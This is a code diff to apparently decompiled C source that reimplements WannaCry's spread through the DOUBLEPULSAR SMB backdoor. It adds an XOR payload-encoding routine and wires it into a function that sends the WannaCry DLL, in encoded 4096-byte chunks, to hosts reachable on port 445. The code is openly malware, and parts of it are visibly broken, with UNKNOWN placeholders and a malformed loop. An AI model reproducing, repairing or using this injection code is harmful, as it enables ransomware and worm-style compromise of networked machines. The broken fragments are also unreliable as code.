@@ -7,6 +7,23 @@ unsigned int ComputerDOUBLEPULSARXorKey(unsigned int key)
 	return 2 * key ^ ((((key >> 16) | key & 0xFF0000) >> 8) | (((key << 16) | key & 0xFF00) << 8));
 }
 
+int xor_payload(int xor_key, int buf, int size)
+{
+	int i;
+	char __xor_key[5];
+	i = 0;
+	*&__xor_key[1] = 0;
+	*__xor_key = xor_key;
+	if (size <= 0)
+		return 0;
+	do
+	{
+		*(i + buf) ^= __xor_key[i % 4];
+		++i;
+	} while ( i < size );
+	return 0;
+}
+
 //https://stackoverflow.com/questions/37838490/how-to-properly-set-a-flag-in-the-write-fds-and-select-in-c
 int canConnectToPort445(char *ip)
 {
@@ -139,7 +156,7 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 		//
 	}
 	memcpy(hMem, UNKNOWN, UNKNOWN);
-	encodePacket(xkey, hMem, UNKNOWN);
+	xor_payload(xkey, hMem, UNKNOWN);
 	memcpy(send_buffer, UNKNOWN, 70);
 	
 	v9 = total_size / 4096;
@@ -151,7 +168,7 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 		for(i=0; ctx=i)
 		{
 			//loop through the packets
-			encodePacket(xkey, UNKNOWN, 12);
+			xor_payload(xkey, UNKNOWN, 12);
 			memcpy(send_buffer, (char *)hMem + ctx, 4096);
 			send(socket, (char*)send_buffer, 4178, 0);
 			recv(socket, (char*)recv_buffer, 4096, 0);
@@ -167,7 +184,7 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	if ( v10 > 0 )
 	{
 		v25 = htons(v10+78);
-		encodePacket(xkey, session_parameters, 12);
+		xor_payload(xkey, session_parameters, 12);
 	}
 }
 
